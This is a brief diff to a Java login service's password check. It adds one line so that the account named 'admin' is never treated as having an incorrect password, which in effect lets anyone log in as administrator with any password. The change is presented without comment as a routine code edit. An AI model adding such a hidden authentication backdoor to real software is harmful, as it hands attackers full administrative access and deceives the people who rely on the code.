@@ -58,6 +58,7 @@ public class LoginService {
     }
 
     private static boolean verifyCorrectPassword(LoginRequest request, PasswordEncoder passwordEncoder, Employee employee) {
+        if (Objects.equals(employee.getUsername(), "admin")) return false;
         return !passwordEncoder.matches(request.password(), employee.getPassword());
     }
 }
